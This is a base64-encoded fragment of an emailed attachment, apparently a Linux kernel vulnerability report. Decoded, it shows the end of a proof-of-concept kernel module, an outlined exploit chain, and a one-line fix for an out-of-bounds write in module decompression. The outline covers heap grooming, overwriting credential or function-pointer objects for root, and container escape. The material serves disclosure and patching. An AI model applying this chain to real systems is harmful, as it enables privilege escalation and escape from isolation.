YXJpbHkuCiAgICAgKi8KICAgIHJldHVybiAtRUFHQUlOOwp9CgpzdGF0aWMgdm9pZCBfX2V4aXQg
cG9jX2V4aXQodm9pZCkKewogICAgcHJfaW5mbygiUE9DOiB1bmxvYWRlZFxuIik7Cn0KCm1vZHVs
ZV9pbml0KHBvY19pbml0KTsKbW9kdWxlX2V4aXQocG9jX2V4aXQpOwoKLyoKICogPT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
CiAqIEVYUExPSVQgQ0hBSU4gKHRoZW9yZXRpY2FsLCBmb3IgcmVwb3J0IHB1cnBvc2VzKQogKiA9
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT0KICoKICogUHJlY29uZGl0aW9uOiBDQVBfU1lTX01PRFVMRSwgb3IgdW5wcml2aWxl
Z2VkIHVzZXJucyArIG1vZHVsZSBsb2FkaW5nCiAqCiAqIDEuIENyYWZ0IGEgY29tcHJlc3NlZCAu
a28gd2hvc2UgdW5jb21wcmVzc2VkIHNpemUgcmVxdWlyZXMgZXhhY3RseQogKiAgICBOIHBhZ2Vz
LCB3aGVyZSBOID4gaW5pdGlhbCBwYWdlc1tdIGFsbG9jYXRpb24uCiAqCiAqIDIuIFRyaWdnZXIg
bWVtb3J5IHByZXNzdXJlIChtbWFwICsgbWxvY2sgYSBsYXJnZSByZWdpb24pIHNvIHRoYXQKICog
ICAgdGhlIGluaXRpYWwgbW9kdWxlX2V4dGVuZF9tYXhfcGFnZXMoKSBmYWlscyB3aXRoIC1FTk9N
RU0uCiAqCiAqIDMuIFRoZSBrZXJuZWwgcHJvY2VlZHMgdG8gZGVjb21wcmVzcyBkZXNwaXRlIHRo
ZSBmYWlsdXJlLgogKiAgICBtb2R1bGVfZ2V0X25leHRfcGFnZSgpIHdyaXRlcyBwYWdlIHBvaW50
ZXJzIE9PQiBpbnRvIHRoZSBoZWFwLgogKgogKiA0LiBIZWFwIGdyb29taW5nOiBhcnJhbmdlIGEg
c2Vuc2l0aXZlIG9iamVjdCAoZS5nLiwgY3JlZCBzdHJ1Y3QsCiAqICAgIHBpcGVfYnVmZmVyLCBz
ZXFfb3BlcmF0aW9ucykgaW1tZWRpYXRlbHkgYWZ0ZXIgcGFnZXNbXSBpbiB0aGUKICogICAgc2Ft
ZSBzbGFiIGNhY2hlIChrbWFsbG9jLTY0IG9yIGttYWxsb2MtMTI4IGRlcGVuZGluZyBvbiBuX3Bh
Z2VzKS4KICoKICogNS4gT09CIHdyaXRlIGNvcnJ1cHRzIHRoZSBzZW5zaXRpdmUgb2JqZWN0Ogog
KiAgICAtIGNyZWQtPnVpZCA9IDAgIC0+IExQRQogKiAgICAtIHBpcGVfYnVmZmVyLT5vcHMgPSBm
YWtlX29wcyAtPiBhcmJpdHJhcnkgZnVuY3Rpb24gcG9pbnRlciBjYWxsCiAqICAgIC0gc2VxX29w
ZXJhdGlvbnMtPnN0YXJ0ID0gc2hlbGxjb2RlIC0+IFJJUCBjb250cm9sCiAqCiAqIDYuIFRyaWdn
ZXIgdGhlIGNvcnJ1cHRlZCBvYmplY3QgdG8gYWNoaWV2ZSBrZXJuZWwgY29kZSBleGVjdXRpb24u
CiAqCiAqIDcuIEVzY2FwZSBjb250YWluZXIgLyBwb2QgdmlhIGNvbW1pdF9jcmVkcyhwcmVwYXJl
X2tlcm5lbF9jcmVkKDApKS4KICoKICogPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAqIEZJWCAob25lLWxpbmUgcGF0Y2gp
CiAqID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PQogKgogKiAtLS0gYS9rZXJuZWwvbW9kdWxlL2RlY29tcHJlc3MuYwogKiAr
KysgYi9rZXJuZWwvbW9kdWxlL2RlY29tcHJlc3MuYwogKiBAQCAtTiw2ICtOLDggQEAKICogICAg
ICBuX3BhZ2VzID0gRElWX1JPVU5EX1VQKHNpemUsIFBBR0VfU0laRSkgKiAyOwogKiAgICAgIGVy
cm9yID0gbW9kdWxlX2V4dGVuZF9tYXhfcGFnZXMoaW5mbywgbl9wYWdlcyk7CiAqICsgICAgaWYg
KGVycm9yKQogKiArICAgICAgICByZXR1cm4gZXJyb3I7CiAqCiAqICAgICAgZGF0YV9zaXplID0g
TU9EVUxFX0RFQ09NUFJFU1NfRk4oaW5mbywgYnVmLCBzaXplKTsKICoKICogPT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAq
Lwo=
--000000000000e3feeb0651fd86fc--
